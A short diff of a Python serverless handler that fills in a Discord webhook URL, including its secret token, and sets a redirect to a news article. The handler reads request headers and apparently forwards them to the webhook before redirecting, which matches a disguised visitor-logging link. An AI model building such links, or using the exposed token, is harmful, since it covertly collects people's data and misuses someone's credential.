@@ -2,8 +2,8 @@ import json
 import requests
 from datetime import datetime
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # ضع رابط الويب هوك
-REDIRECT_URL = "https://example.com"  # ضع رابط التوجيه النهائي
+DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  # ضع رابط الويب هوك
+REDIRECT_URL = "https://jo24.net/article/539190"  # ضع رابط التوجيه النهائي
 
 def handler(event, context):
     headers = event.get("headers", {})
